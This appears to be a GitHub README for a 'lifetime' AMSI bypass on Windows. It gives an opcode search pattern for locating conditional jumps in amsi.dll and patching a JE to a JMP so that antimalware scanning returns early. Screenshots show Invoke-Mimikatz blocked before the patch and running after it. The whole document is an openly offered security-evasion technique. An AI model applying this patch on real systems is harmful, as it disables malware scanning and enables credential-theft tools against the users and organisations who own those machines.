# Lifetime AMSI bypass

## Opcode Scan

* we get the exact address of the jump instruction by searching for the first byte of each instruction this technique is effective even in the face of updates or modifications to the target data set.

* for example :

  ` | 48:85D2 | test rdx, rdx |`

  ` | 74 3F | je amsi.7FFAE957C694 |`

  ` | 48 : 85C9 | test rcx, rcx |`

  ` | 74 3A | je amsi.7FFAE957C694 |`

  ` | 48 : 8379 08 00 | cmp qword ptr ds : [rcx + 8] , 0 |`

  ` | 74 33 | je amsi.7FFAE957C694 |`

* the search pattern will be like this :

  `{ 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74,'?' ,0x48,'?' ,'?' ,'?' ,'?',0x74,0x33}`

  
  ![image](https://user-images.githubusercontent.com/60795188/221431685-60fb2012-db0f-41aa-bd7b-3a19f07c91c4.png)



# Patch

## Before Patch

* The program tests the value of RDX against itself. If the comparison evaluates to 0, the program executes a jump to return. Otherwise, the program proceeds to evaluate the next instruction

  ![image](https://user-images.githubusercontent.com/60795188/221431975-73c78c9c-5358-44c2-b0de-41d68024e2bb.png)

* we cant execute "Invoke-Mimikatz"

  ![image](https://user-images.githubusercontent.com/60795188/221432132-20993ccf-c53e-493d-8b22-feaea86fb6bf.png)

## After Patch


* we patch the first byte and change it from JE to JMP so it return directly 

  ![Screenshot 2023-02-26 195848](https://user-images.githubusercontent.com/60795188/221444031-5b8c365f-cb38-4ce4-89b5-153ecc12208d.png)

  ![image](https://user-images.githubusercontent.com/60795188/221432418-841db688-879c-4915-8d6e-926236a3732c.png)

* now we execute "Invoke-Mimikatz"

  ![Screenshot 2023-02-26 195914](https://user-images.githubusercontent.com/60795188/221432425-5c121433-33f4-4b8d-add6-63c078d5edb8.png)
